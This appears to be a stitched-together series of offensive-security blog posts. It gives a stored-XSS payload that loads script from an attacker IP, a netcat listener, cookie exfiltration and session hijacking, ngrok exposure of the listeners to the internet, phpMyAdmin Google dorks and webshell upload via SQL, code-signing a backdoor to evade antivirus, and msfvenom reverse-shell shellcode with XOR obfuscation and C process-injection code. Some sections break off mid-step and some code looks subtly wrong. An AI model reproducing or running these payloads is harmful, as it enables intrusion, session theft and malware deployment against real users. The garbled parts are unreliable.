For this demonstration, I will illustrate a basic reverse shell exploit through an XSS injection on DVWA. Before we begin, I assume you have discovered a Stored XSS vulnerability on one of the targeted web URLs.
Basic Reverse ShellAttacker SideIn the attacker terminal, past this command and manage your prefer port.
TERMINAL Collapse Copy while :; do printf "0xrahu$ "; read c; echo $c | nc -lp 4444 >/dev/null; done while :; do printf "0xrahu$ "; read c; echo $c | nc -lp 4444 >/dev/null; done Client SlideIn vuln stored XSS web url input field, put this script below.
TERMINAL Collapse Copy <svg onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//172.16.143.31:4444";d.body.appendChild(z)},0)>//or<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//172.16.143.31:4444";d.body.appendChild(z)},0)</script>//make sure the ip and port are point to the attacker machine. <svg onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//172.16.143.31:4444";d.body.appendChild(z)},0)>//or<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//172.16.143.31:4444";d.body.appendChild(z)},0)</script>//make sure the ip and port are point to the attacker machine. after they get back to the xss page, your reverse-shell will work. In this case, we should refresh the page acting as a user, then the reverse shell is syn/ack; let’s try to trigger the alert for testing.
to execute the command you need to hit Enter then Ctrl+C. We can alert the cookie as well by using below command.
TERMINAL Collapse Copy alert(document.cookie) alert(document.cookie) this way will only show in the client side not server side. Stealing CookieSo, to steal the user cookie after getting the reverse shell, we need to get help from the powerful toolkit named “nc”.
In Attacker Side, open another terminal and type below command.
TERMINAL Collapse Copy nc -lvp 3333 nc -lvp 3333 In Reverse Shell Terminal type this command to inject the payload and request the cookie.
TERMINAL Collapse Copy document.location='http://172.16.143.31:3333/c='+document.cookie//make sure the ip point to the attacker side and port point to nc port number. document.location='http://172.16.143.31:3333/c='+document.cookie//make sure the ip point to the attacker side and port point to nc port number. now you get the user cookie. Full Admin ControlSo we got the user cookie “PHPSESSID=xxx”, Next step is to login the account using his/her cookie.
In firefox download this extension Cookie-Editor , then browse to the login page; put cookie and those required setting.
first remove the old cookie, then save it; put the new cookie, save and reload. wuulaa!!! Okay, now we have modified the user cookie and managed to login as an administrator profile.
Via Ngrok to H3x World WideSo, to let this scenario work outside the land, You can follow these step.
Open Ngrok config file at ~/.config/ngrok/ngrok.yml and add these setting.
TERMINAL Collapse Copy ersion: "3"agent:authtoken: xxxxxtunnels:xss-rvr-shl:proto: tcpaddr: 4444xss-cookie:proto: tcpaddr: 3333 ersion: "3"agent:authtoken: xxxxxtunnels:xss-rvr-shl:proto: tcpaddr: 4444xss-cookie:proto: tcpaddr: 3333 In terminal type this command to start ngrok.
TERMINAL Collapse Copy ngrok start --all ngrok start --all it should sth like this. Now you just change the ip to these ngrok ip|hostname/port and follow the first step of xss alert or stealing cookie etc.
TERMINAL Collapse Copy //Keep local reverse shell on port 4444while :; do printf "0xrahu$ "; read c; echo $c | nc -lp 4444 >/dev/null; done//Change ip to ngrok hostname|ip/port in the script that put to the input field<svg onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//0.tcp.ap.ngrok.io:20480";d.body.appendChild(z)},0)>//if hostname didn't work please use ip instead//To steal the cookie, just change the ip that document.cookie send to, to ngrok ip/hostname//Keep local port same as 3333 in ncdocument.location='http://0.tcp.ap.ngrok.io:11321/c='+document.cookie//Now it good to gooo! //Keep local reverse shell on port 4444while :; do printf "0xrahu$ "; read c; echo $c | nc -lp 4444 >/dev/null; done//Change ip to ngrok hostname|ip/port in the script that put to the input field<svg onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//0.tcp.ap.ngrok.io:20480";d.body.appendChild(z)},0)>//if hostname didn't work please use ip instead//To steal the cookie, just change the ip that document.cookie send to, to ngrok ip/hostname//Keep local port same as 3333 in ncdocument.location='http://0.tcp.ap.ngrok.io:11321/c='+document.cookie//Now it good to gooo!

Google DorksFirst, we need to find vulnerable phpMyAdmin instances. We can use Google Dorks to search for phpMyAdmin login pages or specific pages that indicate the presence of phpMyAdmin. Here are some useful Google Dorks for finding phpMyAdmin instances:
TEXT Collapse Copy 1allinurl:index.php?db=information_schema 2allinurl:/read_dump.php allinurl:index.php?db=information_schemaallinurl:/read_dump.php an example of google dorking for phpMyAdmin SQL Query for Shell UploadTo upload a webshell via phpMyAdmin, we can use the following steps:
Note: This method requires a root access to the database, which is often the case in many vulnerable setups.
Log in to phpMyAdmin database management interface and create a new database (e.g., uploader). then point to the SQL tab and run the following SQL query:

SQL Collapse Copy 1select * into dumpfile 'C:/xampp/htdocs/wkspace/up.php' from userform select * into dumpfile 'C:/xampp/htdocs/wkspace/up.php' from userform Note: To find the location of the web root directory, we can run the following query in phpMyAdmin SQL tab:
SQL Collapse Copy 1SELECT @@basedir; 2SELECT @@datadir; 3SELECT @@tmpdir; SELECT @@basedir;SELECT @@datadir;SELECT @@tmpdir; More information: SQL Cheat Sheet After that we move to the table user_upload and paste the following query:

Generate the KEYWe can use this in windows 10/11 powershell to generate a self-signed certificate for code signing purposes. This certificate can be used to sign your backdoor or any executable, which can help in evading antivirus detection.
POWERSHELL Collapse Copy //make sure it run as administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\CurrentUser\My //make sure it run as administratorNew-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\CurrentUser\My Export the certificate and private key POWERSHELL Collapse Copy Export-Certificate -Cert (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)[0] -FilePath code_signing.crt Export-Certificate -Cert (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)[0] -FilePath code_signing.crt For number [0], you can change it to the index of the certificate you want to export if you have multiple certificates in your store.
Import as Trusted PublisherTo import the certificate as a trusted publisher, you can use the following command in PowerShell:
POWERSHELL Collapse Copy Import-Certificate -FilePath .\code_signing.crt -Cert Cert:\CurrentUser\TrustedPublisher Import-Certificate -FilePath .\code_signing.crt -Cert Cert:\CurrentUser\TrustedPublisher Import as Root Certificate AuthorityTo import the certificate as a root certificate authority, you can use the following command in PowerShell:
POWERSHELL Collapse Copy Import-Certificate -FilePath .\code_signing.crt -Cert Cert:\CurrentUser\Root Import-Certificate -FilePath .\code_signing.crt -Cert Cert:\CurrentUser\Root Signing ApplicationTo sign an application using the generated certificate, you can use below command in PowerShell:
POWERSHELL Collapse Copy Set-AuthenticodeSignature .\app.exe -Certificate (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert) Set-AuthenticodeSignature .\app.exe -Certificate (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert) To be noted that the above command will sign the application with the first code signing certificate found in the current user’s certificate store. If you have multiple certificates, you may need to specify the correct one by using its thumbprint or other identifying information.

In the previous posts, we have explored various techniques for process injection, such as using VirtualAllocEx and CreateRemoteThread. However, these methods often require write and execute permissions on the target process, which can trigger antivirus (AV) detection. In this article, we will create shellcode using the Process Injection technique combined with XOR encryption to obfuscate the code and evade antivirus detection. By encrypting our shellcode, we can make it less recognizable to AV software, which often relies on signature-based detection methods.
Below is the process of creating a payload using shellcode in C language, targeting a 64-bit machine.
main.cpp Collapse Copy msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c XOR ShellcodeTo further obfuscate our shellcode, we can use XOR encryption. This involves taking each byte of the shellcode and XORing it with a key. The same key will be used to decrypt the shellcode at runtime before execution.
xor_encrypt.py Collapse Copy raw_shellcode = "\xaa\xda\xca\[...]\xbe\x14\x49" enc_shellcode = [] print ("[+] Shellcode is encoding") for opcode in raw_shellcode: enc_opcode = (ord(opcode) ^ 0x41) enc_shellcode.append(enc_opcode) print ("========================Shellcode========================\n\n") print ("".join(["\\x{0}".format(hex(abs(i)).replace("0x", "")) for i in enc_shellcode])) print ("\n\n========================Shellcode========================") raw_shellcode = "\xaa\xda\xca\[...]\xbe\x14\x49"enc_shellcode = []print ("[+] Shellcode is encoding")for opcode in raw_shellcode:enc_opcode = (ord(opcode) ^ 0x41)enc_shellcode.append(enc_opcode)print ("========================Shellcode========================\n\n")print ("".join(["\\x{0}".format(hex(abs(i)).replace("0x", "")) for i in enc_shellcode]))print ("\n\n========================Shellcode========================") After running the above Python script, we will get a new encoded shellcode. We can copy this encoded shellcode and use it in our C code to perform the process injection.
WINAPIsOur shellcode is ready now so let’s create our process injection binary. But before we move to the next step, let’s have a look at the Windows APIs that we will be using in our code.

Because the main idea of process injection is a create a new allocation space for the shellcode in a local process then write the shellcode in that allocation and execute it so before creating a new allocation into the memory you need to open this process first.

Why we used VirtualAllocEx not VirtualAlloc? Because I need to allocate memory space in another process address space, catch it.
Basically we can use VirtualAlloc for our current process but VirtualAllocEx for another local process.

What is the difference between CreateThread and CreateRemoteThread?
CreateThread is only allows you to create a thread for the current process. CreateRemoteThread is allows you to create a thread for anther local process. In the previous post, we discussed the Self Injection method, which allows us to inject shellcode into a process and execute it. However, this method requires write and execute permissions on the memory where the shellcode is injected. In this post, we will explore how to perform process injection without requiring write/execute permissions.
Create a payload using Shellcode in C language targeting a 64-bit machine.
TERMINAL Collapse Copy msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c Below is a method for injecting a process into a specific PID without DEP protection and without write or execute permissions (Non-Writable / Non-Executable Allocation).
main.cpp Collapse Copy #include <stdio.h> #include <Windows.h> int main(int argc, char* argv[]) { unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; DWORD oldPerms; DWORD PID = 1524; printf("Injecting to PID: %i", PID); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &oldPerms); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; } #include <stdio.h>#include <Windows.h>int main(int argc, char* argv[]){unsigned char shellcode[] ="\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50""\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52""\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb""\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";HANDLE processHandle;HANDLE remoteThread;PVOID remoteBuffer;DWORD oldPerms;DWORD PID = 1524;printf("Injecting to PID: %i", PID);processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &oldPerms);remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);CloseHandle(processHandle);return 0;} Change the PID to the target process you want to inject into, then compile the code as usual (for Visual Studio 20xx, you may need to disable DEP Protection before building). After that, try running the executable and it should inject the shellcode into the target process without requiring write or execute permissions.
In this method, we first open a handle to the target process using OpenProcess. Then, we allocate memory in the target process using VirtualAllocEx with PAGE_EXECUTE_READ permissions, which allows us to execute code but not write to it. Next, we write our shellcode into the allocated memory using WriteProcessMemory. After that, we change the permissions of the allocated memory to PAGE_READONLY using VirtualProtectEx, which prevents any further modifications to the memory. Finally, we create a remote thread in the target process that starts execution at the address of our shellcode.

Self Injection is a technique that allows an attacker to inject shellcode into a process and execute it. This method is often used in malware development and can be used to bypass security measures. The basic idea is to create a new thread in the target process and execute the shellcode in that thread.
Below is an example of how to create a payload using Shellcode in C language targeting a 64-bit machine.
